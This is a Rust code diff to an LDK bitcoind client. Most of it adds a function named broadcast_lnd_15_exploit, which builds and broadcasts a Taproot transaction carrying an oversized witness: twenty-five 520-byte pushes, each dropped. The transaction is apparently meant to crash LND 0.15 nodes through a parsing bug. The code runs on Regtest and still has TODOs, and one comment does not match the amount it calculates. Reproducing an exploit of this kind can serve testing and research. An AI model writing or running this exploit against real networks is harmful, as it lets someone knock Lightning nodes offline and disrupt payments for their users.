@@ -1,9 +1,17 @@
 use bitcoin::blockdata::block::Block;
+use bitcoin::blockdata::opcodes;
+use bitcoin::blockdata::script::Builder;
 use bitcoin::blockdata::transaction::Transaction;
 use bitcoin::hash_types::BlockHash;
+use bitcoin::hash_types::Txid;
+use bitcoin::hashes::Hash;
+use bitcoin::psbt::serialize::Serialize;
+use bitcoin::schnorr::UntweakedPublicKey;
+use bitcoin::secp256k1::Secp256k1;
 use bitcoin::util::address::Address;
+use bitcoin::util::taproot::{LeafVersion, TaprootBuilder};
 use bitcoin::util::uint::Uint256;
-use bitcoin::Amount;
+use bitcoin::{Amount, Network, OutPoint, PackedLockTime, Script, Sequence, TxIn, TxOut, Witness};
 use bitcoincore_rpc::bitcoincore_rpc_json::{EstimateMode, FundRawTransactionOptions};
 use bitcoincore_rpc::Client;
 use bitcoincore_rpc::RpcApi;
@@ -13,6 +21,7 @@ use lightning_block_sync::{
     AsyncBlockSourceResult, BlockHeaderData, BlockSource, BlockSourceError,
 };
 use std::collections::HashMap;
+use std::str::FromStr;
 use std::sync::Arc;
 
 pub struct FundedTx {
@@ -77,7 +86,7 @@ impl LdkBitcoindClient {
             .get_new_address(Some(String::as_str(&label.clone())), None)
         {
             Ok(addr) => Ok(addr),
-            Err(e) => Err("could not create new address".into()),
+            Err(e) => Err(e.into()),
         }
     }
 
@@ -236,5 +245,72 @@ impl BroadcasterInterface for LdkBitcoindClient {
                 }
             }
         }
+    }
+}
+
+pub fn broadcast_lnd_15_exploit(
+    bitcoind_client: Arc<Client>,
+) -> Result<String, Box<dyn std::error::Error>> {
+    // TODO generate tweaked public key
+    let secp = Secp256k1::new();
+    let internal_key = UntweakedPublicKey::from_str(
+        "93c7378d96518a75448821c4f7c8f4bae7ce60f804d03d1f0628dd5dd0f5de51",
+    )
+    .unwrap();
+
+    let mut script_builder = Builder::new();
+    for _ in 0..25 {
+        script_builder = script_builder
+            .push_slice(&vec![1; 520])
+            .push_opcode(opcodes::all::OP_DROP);
+    }
+    let script = script_builder.push_opcode(opcodes::OP_TRUE).into_script();
+    let tr_script = script.clone().to_v1_p2tr(&secp, internal_key);
+    let addr = Address::from_script(&tr_script, Network::Regtest).unwrap();
+
+    let txid = bitcoind_client.send_to_address(
+        &addr,
+        Amount::from_sat(110000),
+        None,
+        None,
+        None,
+        None,
+        None,
+        None,
+    )?;
+
+    // create taproot tree
+    let tr = TaprootBuilder::new().add_leaf(0, script.clone()).unwrap();
+    let spend_info = tr.finalize(&secp, internal_key).unwrap();
+    // create control block
+    let control_block = spend_info
+        .control_block(&(script.clone(), LeafVersion::TapScript))
+        .unwrap();
+    // witness is control block followed by spending script
+    let witness = vec![script.serialize(), control_block.serialize()];
+
+    let txin = TxIn {
+        previous_output: OutPoint { txid, vout: 0 }, // TODO find correct output
+        script_sig: Script::new(),
+        sequence: Sequence::ZERO,
+        witness: Witness::from_vec(witness),
+    };
+
+    // amount sent to addr - 500
+    let amt: u64 = 110000 - 99966;
+
+    let created_tx = Transaction {
+        version: 2,
+        lock_time: PackedLockTime::ZERO,
+        input: vec![txin],
+        output: vec![TxOut {
+            value: amt,
+            script_pubkey: Script::new_p2pkh(&bitcoin::PubkeyHash::all_zeros()),
+        }],
+    };
+
+    match bitcoind_client.send_raw_transaction(&created_tx) {
+        Ok(txid) => Ok(txid.to_string()),
+        Err(e) => Err(e.into()),
     }
 }
